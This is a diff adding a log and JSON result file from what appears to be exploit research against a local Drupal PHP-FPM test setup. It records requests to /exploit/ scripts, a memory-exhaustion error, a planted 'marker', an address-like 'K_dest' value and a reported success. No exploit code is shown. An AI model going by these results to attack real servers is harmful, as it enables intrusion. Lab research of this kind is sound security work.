@@ -1,0 +1,26 @@
+[02:05:17] POST /exploit/sess.php status=200 sent=80 ms=2 err=None
+[02:05:18] POST /exploit/trigger.php status=200 sent=222 ms=2 err=None
+[02:05:19] POST /exploit/health.php status=200 sent=80 ms=0 err=None
+{
+ "label": "r0",
+ "master": 167756,
+ "K_dest": 140715311517696,
+ "worker_before_final": 171102,
+ "final_plant": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 20480 bytes) in <b>/tmp/opencode/research/drupal_fpm_20261022T013000Z/www/exploit/sess.php</b> on line <b>"
+ },
+ "final_trigger": {
+  "status": 200,
+  "head": "trigger-ok\n"
+ },
+ "marker_after": true,
+ "worker_after_final_trigger": 171102,
+ "worker_after_health": 171102,
+ "health": {
+  "status": 200,
+  "head": "health-ok\n"
+ },
+ "survived": true,
+ "success": true
+}
